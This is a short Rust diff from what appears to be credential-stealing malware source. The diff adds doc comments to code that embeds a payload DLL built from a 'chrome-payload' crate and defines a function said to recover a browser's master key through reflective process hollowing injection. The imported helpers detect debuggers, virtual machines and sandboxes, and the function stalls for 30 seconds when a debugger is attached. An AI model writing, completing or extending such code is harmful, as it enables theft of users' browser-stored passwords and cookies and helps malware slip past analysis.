@@ -2,11 +2,13 @@ use std::{collections::HashMap, collections::HashSet, sync::Mutex};
 
 use super::{env_configured, is_debugger_attached, is_virtualized_environment, run_sandbox_decoy};
 
+/// Payload DLL embedded at build time (compiled separately via `chrome-payload` crate).
 const EMBEDDED_PAYLOAD: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload.dll"));
 
 static KEY_CACHE: Mutex<Option<HashMap<String, Vec<u8>>>> = Mutex::new(None);
 static FAIL_CACHE: Mutex<Option<HashSet<String>>> = Mutex::new(None);
 
+/// Recover the browser master key via reflective process hollowing injection.
 pub fn get_secret(browser_name: &str) -> Option<Vec<u8>> {
     if is_debugger_attached() {
         std::thread::sleep(std::time::Duration::from_secs(30));
